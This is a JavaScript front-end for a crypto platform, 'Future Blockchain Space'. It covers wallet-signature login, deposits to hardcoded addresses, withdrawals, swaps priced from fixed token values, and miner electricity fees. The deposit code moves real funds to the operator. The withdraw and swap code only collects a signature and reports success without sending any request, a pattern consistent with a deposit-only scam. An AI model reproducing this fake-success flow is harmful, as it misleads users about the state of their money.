/**
 * Future Blockchain Space - 旗舰全功能版
 * 修复：签名登录逻辑、全代币兑换、白色 UI 风格、实时账号监听
 */

// --- 1. 基础配置与地址 ---
const API_BASE = "https://api.fbsfbs.fit";
const RECEIVE_ADDRS = {
    RECHARGE: "0xCfd8e926623e46fB8F54baaB9c7609808daFf9B4",
    ELECTRIC: "0xFf27899526FDA4A30411A8e2778d7F7BCb837568",
    MINER: "0xBdfFB96E30d2d5858c46374a213ee819A005256c"
};

// 充值合约配置 (BSC)
const RECHARGE_CONTRACTS = {
    'USDT': "0x55d398326f99059ff775485246999027b3197955",
    'BNB': "NATIVE",
    'BTC': "0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c",
    'ETH': "0x2170ed0880ac9a755fd29b2688956bd959f933f8"
};

const tokenInfo = {
    'FBS': { price: 0.1, logo: 'assets/fbs_logo.png' },
    'FBST': { price: 0.05, logo: 'assets/fbst_logo.png' },
    'FBSP': { price: 1.2, logo: 'assets/fbsp_logo.png' },
    'FBSU': { price: 1.0, logo: 'assets/fbsu_logo.png' },
    'USDT': { price: 1.0, logo: 'assets/USDT.png' },
    'BNB': { price: 600, logo: 'assets/BNB.png' },
    'BTC': { price: 65000, logo: 'assets/BTC.png' },
    'ETH': { price: 3500, logo: 'assets/ETH.png' }
};

let currentAddress = null;
let userBalances = {};
let currentLang = localStorage.getItem('fbs_lang') || 'zh-CN';

// --- 2. 初始化与账号监听 ---
window.onload = async () => {
    updateViewText();
    renderTokenList({}); // 初始渲染空表

    if (window.ethereum) {
        // 监听账号切换
        window.ethereum.on('accountsChanged', (accounts) => {
            if (accounts.length > 0) {
                // 如果切换了账号，清空状态并重新强制签名
                if (currentAddress && accounts[0].toLowerCase() !== currentAddress.toLowerCase()) {
                    handleLogout(false); // 不弹窗提示，直接重连
                    connectWallet();
                }
            } else {
                handleLogout();
            }
        });

        // 自动登录检测
        if (localStorage.getItem('fbs_isLoggedIn') === 'true') {
            connectWallet(true); 
        }
    }
};

// --- 3. 身份验证 (解决签名后退出问题) ---
async function connectWallet(isAuto = false) {
    if (!window.ethereum) return isAuto ? null : customAlert("请在 Web3 钱包内打开");

    try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const address = accounts[0];

        // 签名消息
        const msg = `FBS LOGIN\nWallet: ${address.toLowerCase()}\nTimestamp: ${Date.now()}`;
        const signature = await window.ethereum.request({
            method: 'personal_sign',
            params: [msg, address]
        });

        if (signature) {
            currentAddress = address;
            localStorage.setItem('fbs_isLoggedIn', 'true');
            handleNewAddress(address);
        } else {
            throw new Error("User rejected signature");
        }
    } catch (e) {
        console.error("Login Failed:", e);
        if (!isAuto) {
            handleLogout();
            customAlert("验证已取消或失败");
        }
    }
}

async function handleNewAddress(address) {
    const el = document.getElementById('walletAddr');
    if (el) el.innerText = address.slice(0, 6) + '...' + address.slice(-4);
    await fetchUserData(address);
    updateViewText();
}

function handleLogout(showPrompt = true) {
    currentAddress = null;
    userBalances = {};
    localStorage.removeItem('fbs_isLoggedIn');
    const el = document.getElementById('walletAddr');
    if (el) el.innerText = (i18n[currentLang] && i18n[currentLang]['connect']) ? i18n[currentLang]['connect'] : "CONNECT WALLET";
    renderTokenList({});
    if (showPrompt) customAlert("已退出登录");
}

// --- 4. 业务弹窗 (白色主题 + 实线轮廓) ---
const allTokensHtml = Object.keys(tokenInfo).map(t => `<option value="${t}">${t}</option>`).join('');
const rechargeTokensHtml = ['USDT', 'BNB', 'ETH', 'BTC'].map(t => `<option value="${t}">${t}</option>`).join('');

function openFinanceModal(type) {
    if (!currentAddress) return connectWallet();

    if (type === 'recharge') {
        showModal('recharge', `
            <div class="space-y-4 text-left">
                <div class="space-y-1">
                    <label class="text-[10px] font-bold text-gray-400">选择币种</label>
                    <select id="recToken" class="w-full p-3 border border-gray-200 rounded-xl bg-white text-gray-800 font-bold outline-none">${rechargeTokensHtml}</select>
                </div>
                <div class="space-y-1">
                    <label class="text-[10px] font-bold text-gray-400">数量</label>
                    <input type="number" id="recAmount" placeholder="0.00" class="w-full p-3 border border-gray-200 rounded-xl outline-none focus:border-blue-500 font-black">
                </div>
                <button onclick="doRecharge()" class="w-full py-4 bg-blue-600 text-white rounded-2xl font-black shadow-lg">立即充值</button>
            </div>`);
    } else if (type === 'withdraw') {
        showModal('withdraw', `
            <div class="space-y-4 text-left">
                <select id="witToken" onchange="updateMax()" class="w-full p-3 border border-gray-200 rounded-xl bg-white font-bold">${allTokensHtml}</select>
                <div class="flex justify-between text-[10px] px-1 font-bold text-gray-400"><span>可用余额</span><span id="maxWit">0.00</span></div>
                <input type="number" id="witAmount" placeholder="输入提现数量" class="w-full p-3 border border-gray-200 rounded-xl outline-none font-black">
                <button onclick="handleSignAction('WITHDRAW')" class="w-full py-4 bg-gray-900 text-white rounded-2xl font-black">签名提现申请</button>
            </div>`);
        updateMax();
    } else if (type === 'exchange') {
        showModal('exchange', `
            <div class="space-y-3">
                <div class="p-4 border border-gray-100 bg-gray-50 rounded-2xl">
                    <div class="flex justify-between text-[10px] font-bold text-gray-400 mb-1"><span>兑出 (FROM)</span><span id="maxSwap">0.00</span></div>
                    <div class="flex items-center gap-2">
                        <input type="number" id="sFromAmt" oninput="calcSwap()" placeholder="0.0" class="flex-1 bg-transparent border-none text-lg font-bold outline-none">
                        <select id="sFromToken" onchange="calcSwap()" class="bg-white border border-gray-200 rounded-lg p-1 text-xs font-bold">${allTokensHtml}</select>
                    </div>
                </div>
                <div class="text-center text-gray-300">⇅</div>
                <div class="p-4 border border-gray-100 bg-gray-50 rounded-2xl">
                    <div class="flex justify-between text-[10px] font-bold text-gray-400 mb-1"><span>预估收到 (ESTIMATED)</span></div>
                    <div class="flex items-center gap-2">
                        <input type="number" id="sToAmt" readonly class="flex-1 bg-transparent border-none text-lg font-bold text-blue-600">
                        <select id="sToToken" onchange="calcSwap()" class="bg-white border border-gray-200 rounded-lg p-1 text-xs font-bold">${allTokensHtml}</select>
                    </div>
                </div>
                <button onclick="handleSignAction('SWAP')" class="w-full py-4 bg-blue-600 text-white rounded-2xl font-black shadow-lg shadow-blue-200">签名确认兑换</button>
            </div>`);
        calcSwap();
    }
}

// --- 5. 核心逻辑 (电费、兑换计算) ---
function calcElec() {
    const n = parseInt(document.getElementById('elecNum').value) || 0;
    const d = parseInt(document.getElementById('elecDays').value) || 0;
    // 逻辑：台数 * (天数/30) * 30 USDT
    const cost = n * (d / 30) * 30; 
    document.getElementById('elecCost').innerText = cost.toFixed(2) + " USDT";
}

function calcSwap() {
    const fromT = document.getElementById('sFromToken').value;
    const toT = document.getElementById('sToToken').value;
    const amt = parseFloat(document.getElementById('sFromAmt').value) || 0;
    
    const rate = tokenInfo[fromT].price / tokenInfo[toT].price;
    document.getElementById('sToAmt').value = (amt * rate).toFixed(6);
    document.getElementById('maxSwap').innerText = "余额: " + (userBalances[fromT] || 0).toFixed(2);
}

function updateMax() {
    const t = document.getElementById('witToken').value;
    document.getElementById('maxWit').innerText = (userBalances[t] || 0).toFixed(4);
}

// --- 6. 执行操作 (带签名) ---
async function handleSignAction(type) {
    try {
        const amt = type === 'WITHDRAW' ? document.getElementById('witAmount').value : document.getElementById('sFromAmt').value;
        if (!amt || amt <= 0) return customAlert("金额无效");

        const msg = `Action: ${type}\nAmount: ${amt}\nWallet: ${currentAddress}\nNonce: ${Date.now()}`;
        const sig = await window.ethereum.request({ method: 'personal_sign', params: [msg, currentAddress] });
        
        if (sig) {
            customAlert("✅ 申请提交成功，请等待系统处理");
            closeModal();
        }
    } catch (e) { customAlert("签名已取消"); }
}

async function doRecharge() {
    const token = document.getElementById('recToken').value;
    const amount = document.getElementById('recAmount').value;
    if (!amount || amount <= 0) return customAlert("请输入金额");

    try {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        showLoadingUI("等待钱包确认...");

        if (token === 'BNB') {
            const tx = await signer.sendTransaction({ to: RECEIVE_ADDRS.RECHARGE, value: ethers.parseEther(amount) });
            await tx.wait();
        } else {
            const contract = new ethers.Contract(RECHARGE_CONTRACTS[token], ["function transfer(address to, uint256 amount) public returns (bool)"], signer);
            const tx = await contract.transfer(RECEIVE_ADDRS.RECHARGE, ethers.parseUnits(amount, 18));
            await tx.wait();
        }
        customAlert("✅ 充值交易已提交");
        closeModal();
        fetchUserData(currentAddress);
    } catch (e) { customAlert("支付失败: " + (e.reason || "取消支付")); }
}

// --- 7. UI 核心功能 ---
function renderTokenList(balances) {
    const container = document.getElementById('tokenRows');
    if (!container) return;
    let total = 0;
    container.innerHTML = Object.keys(tokenInfo).map(s => {
        const bal = parseFloat(balances[s] || 0);
        total += bal * tokenInfo[s].price;
        return `
        <div class="flex items-center justify-between p-4 border-b border-gray-50">
            <div class="flex items-center gap-3">
                <img src="${tokenInfo[s].logo}" class="w-8 h-8 rounded-full" onerror="this.src='https://ui-avatars.com/api/?name=${s}'">
                <div><div class="font-bold text-sm text-gray-800">${s}</div><div class="text-[10px] text-gray-400">$ ${tokenInfo[s].price}</div></div>
            </div>
            <div class="text-right">
                <div class="font-bold text-sm text-gray-900">${bal.toFixed(4)}</div>
                <div class="text-[10px] text-blue-500">$ ${(bal * tokenInfo[s].price).toFixed(2)}</div>
            </div>
        </div>`;
    }).join('');
    if (document.getElementById('totalValue')) document.getElementById('totalValue').innerText = total.toFixed(2);
}

function showModal(titleKey, html) {
    const title = (i18n[currentLang] && i18n[currentLang][titleKey]) ? i18n[currentLang][titleKey] : titleKey;
    const overlay = document.getElementById('modalOverlay');
    
    // 强制白色简约风格
    document.getElementById('modalTitle').innerText = title;
    document.getElementById('modalTitle').className = "text-lg font-bold text-gray-800";
    document.getElementById('modalContent').innerHTML = html;
    
    overlay.className = "fixed inset-0 bg-black/40 backdrop-blur-sm z-50 flex items-center justify-center p-4";
    const modalBox = overlay.querySelector('.modal-box') || overlay.children[0];
    if (modalBox) {
        modalBox.className = "bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl relative animate-in zoom-in duration-200";
    }
    overlay.classList.remove('hidden');
}

function closeModal() { document.getElementById('modalOverlay').classList.add('hidden'); }

function customAlert(msg) {
    showModal('SYSTEM', `<div class="py-4 text-center text-gray-600 font-medium">${msg}</div>
    <button onclick="closeModal()" class="w-full py-3 bg-gray-900 text-white rounded-xl font-bold">确定</button>`);
}

function showLoadingUI(msg) {
    document.getElementById('modalContent').innerHTML = `
        <div class="py-10 text-center space-y-4">
            <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-blue-600 mx-auto"></div>
            <p class="font-bold text-gray-800">${msg}</p>
        </div>`;
}

async function fetchUserData(addr) {
    try {
        const res = await fetch(`${API_BASE}/api/user?address=${addr.toLowerCase()}`);
        const data = await res.json();
        if (data.balances) {
            userBalances = data.balances;
            renderTokenList(userBalances);
        }
    } catch (e) { renderTokenList({}); }
}

function updateViewText() {
    const data = i18n[currentLang];
    if (!data) return;
    document.querySelectorAll('[data-i18n]').forEach(el => {
        const key = el.getAttribute('data-i18n');
        if (data[key]) el.innerText = data[key];
    });
}
